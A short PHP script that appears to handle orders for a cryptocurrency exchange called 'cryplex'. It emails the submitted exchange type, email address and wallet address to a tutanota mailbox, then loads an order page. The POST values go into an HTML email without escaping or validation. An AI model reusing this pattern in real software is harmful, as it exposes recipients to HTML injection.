<?php 
	$headers = "MIME-Version: 1.0" . "\r\n" . 
           "Content-type: text/html; charset=UTF-8" . "\r\n".
		   "From: admin@cryplex.exchange". "\r\n";
	$message='Changing: '.$_POST['Changing'].'<br> Email: '.$_POST['mail'].'<br> Wallet: '.$_POST['Wallet'];
	mail('cryplex@tutanota.com', 'New exchange', $message, $headers);
	require_once ("../logic/newOrder/index.html");
?>